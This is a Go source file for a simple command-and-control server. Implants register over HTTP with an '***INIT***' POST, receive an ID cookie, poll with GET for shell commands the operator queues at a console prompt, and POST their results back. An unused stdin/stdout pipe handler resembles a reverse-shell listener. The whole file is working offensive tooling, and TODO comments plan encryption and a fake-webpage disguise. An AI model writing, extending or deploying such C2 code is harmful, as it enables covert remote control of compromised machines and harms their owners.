package main

// Commands, implant, channel, modules
// TODO: channel encryption, multiple agent-side handling(url path or encyption), fake webpage regex command,

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

const addr string = ":39901"
const maxClients int = 300

// var cmds = make([]string, 0)
type cmds []string

// holds id & command pairings
var clients map[int]cmds

// error handling
func handleError(err error) (b bool) {
	if err != nil {
		fmt.Println(err)
		// return true
	}
	return false
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	go io.Copy(os.Stdout, bufio.NewReader(conn))
	io.Copy(bufio.NewWriter(conn), os.Stdin)
}

func newID() int {
	temp := rand.Intn(maxClients)
	// will hang if 300 clients connect
	for clients[temp] != nil {
		temp = rand.Intn(300)
	}
	return temp
}

func getID(r []*http.Cookie) string {
	for _, cookie := range r {
		if cookie.Name == "ID" {
			return cookie.Value
		}
	}
	return ""
}

func httpHandler(w http.ResponseWriter, r *http.Request) {
	var message string
	var buff bytes.Buffer

	switch r.Method {
	case "GET":
		id, _ := strconv.Atoi(getID(r.Cookies()))
		if len(clients[id]) > 0 {
			message = clients[id][0]
			clients[id] = clients[id][1:]
		} else {
			message = "***NIL***"
		}
		w.Write([]byte(message))
		return
	case "POST":
		// TODO: agent timeouts
		buff.ReadFrom(r.Body)
		fmt.Printf("\nFrom %v:\n", r.Host)
		if buff.String() == "***INIT***" {
			id := newID()
			cliCmds := make(cmds, 0)
			clients[id] = cliCmds

			cookie := http.Cookie{Name: "ID", Value: strconv.Itoa(id)}
			http.SetCookie(w, &cookie)

			message = "Success"
			w.Write([]byte(message))
			fmt.Println(id, " attached")
			fmt.Print("=> ")
		} else {
			fmt.Println(buff.String())
			fmt.Print("=> ")
		}
		return
	default:
		message = "Bad method"
		w.Write([]byte(message))
		return

	}

}

func conListenAndServe(addr string, handler http.Handler) {
	if err := http.ListenAndServe(addr, nil); err != nil {
		// panic aborts easily
		// channel <- err
		panic(err)
	}
}

func parseCmd(str string) {
	print(str)
	if str != "" {
		id, _ := strconv.Atoi(strings.Fields(str)[0])
		cmd := strings.Join(strings.Fields(str)[1:], " ")
		clients[id] = append(clients[id], cmd)
	} else {
		time.Sleep(1 * time.Second)
	}
}

func main() {
	clients = make(map[int]cmds)

	http.HandleFunc("/", httpHandler)
	go conListenAndServe(addr, nil)

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("=> ")
		str, _ := reader.ReadString('\n')
		parseCmd(str)
	}

}
